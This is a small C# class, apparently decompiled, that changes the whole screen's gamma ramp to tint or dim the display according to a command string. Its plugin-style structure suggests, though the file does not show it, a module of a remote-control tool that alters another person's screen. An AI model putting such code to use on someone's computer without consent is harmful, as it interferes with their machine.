using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Plugin.Handler;

internal class HandleScreenColors
{
	public struct RAMP
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Red;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Green;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Blue;
	}

	[DllImport("gdi32.dll")]
	private static extern bool SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp);

	public static void SetColor(bool r, bool g, bool b)
	{
		RAMP lpRamp = default(RAMP);
		lpRamp.Red = new ushort[256];
		lpRamp.Green = new ushort[256];
		lpRamp.Blue = new ushort[256];
		for (int i = 0; i < 256; i++)
		{
			lpRamp.Red[i] = (ushort)((r ? 256 : 128) * i);
			lpRamp.Green[i] = (ushort)((g ? 256 : 128) * i);
			lpRamp.Blue[i] = (ushort)((b ? 256 : 128) * i);
		}
		SetDeviceGammaRamp(Graphics.FromHwnd(IntPtr.Zero).GetHdc(), ref lpRamp).ToString();
	}

	public static void Screen(string command)
	{
		if (command == null)
		{
			return;
		}
		switch (command.Length)
		{
		case 4:
			switch (command[0])
			{
			case 'D':
				if (command == "Dark")
				{
					SetColor(r: false, g: false, b: false);
				}
				break;
			case 'B':
				if (command == "Blue")
				{
					SetColor(r: false, g: false, b: true);
				}
				break;
			case 'C':
				if (command == "Cyan")
				{
					SetColor(r: false, g: true, b: true);
				}
				break;
			}
			break;
		case 6:
			switch (command[0])
			{
			case 'P':
				if (command == "Purple")
				{
					SetColor(r: true, g: false, b: true);
				}
				break;
			case 'Y':
				if (command == "Yellow")
				{
					SetColor(r: true, g: true, b: false);
				}
				break;
			}
			break;
		case 7:
			if (command == "Default")
			{
				SetColor(r: true, g: true, b: true);
			}
			break;
		case 3:
			if (command == "Red")
			{
				SetColor(r: true, g: false, b: false);
			}
			break;
		case 5:
			if (command == "Green")
			{
				SetColor(r: false, g: true, b: false);
			}
			break;
		}
	}
}
